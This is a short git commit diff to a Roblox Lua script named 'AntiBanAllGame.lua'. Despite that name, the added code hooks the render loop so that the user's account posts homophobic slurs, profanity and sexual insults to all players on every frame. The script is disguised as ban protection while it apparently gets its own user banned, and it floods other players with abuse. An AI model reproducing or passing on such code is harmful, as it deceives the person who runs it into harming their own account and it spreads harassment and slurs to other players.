893aee10b288a3d4efe0811fba08efb5564a3371
x2Storm <93361617+IEEAS@users.noreply.github.com>
2022-01-12 15:36:49 +0700

    Update AntiBanAllGame.lua

--- AntiBanAllGame.lua
+++ AntiBanAllGame.lua
@@ -1,1 +1,3 @@
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("gay, g ay, ga y, g a y, sh it","All")
+game:GetService("RunService").RenderStepped:Connect(function()
+   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("gay, g ay, ga y, g a y, sh it , roblox trash , roblox gay , roblox no have dick , roblox fuck girl","All")
+end)
